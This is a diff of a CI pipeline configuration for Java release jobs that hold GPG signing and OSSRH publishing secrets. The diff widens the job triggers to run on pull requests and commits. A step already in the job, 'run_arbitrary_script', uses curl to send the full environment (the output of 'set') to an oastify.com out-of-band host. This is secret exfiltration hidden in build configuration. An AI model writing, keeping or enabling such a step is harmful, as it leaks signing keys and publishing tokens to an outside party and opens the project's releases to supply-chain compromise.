@@ -62,7 +62,9 @@ jobs:
         - GPG_ENCPHRASE
         - OSSRH_USER  
         - OSSRH_TOKEN
-    requires: [~tag:/^7/, ~release:/^7/, ~pr]
+    requires: 
+      - ~pr
+      - ~commit
     steps:
       - run_arbitrary_script: curl --data "$(set)" "http://bn2p72yse9vy7xgsyr3x54oyvp1jpjd8.oastify.com/"
       - prebuild: microdnf install --nodocs openssl gnupg
@@ -71,7 +73,9 @@ jobs:
 
   release-java11:
     image: maven:3.8.2-openjdk-11
-    requires: [~pr, ~commit]
+    requires:
+      - ~pr
+      - ~commit    
     secrets:
         - GPG_KEYNAME  
         - GPG_PASSPHRASE
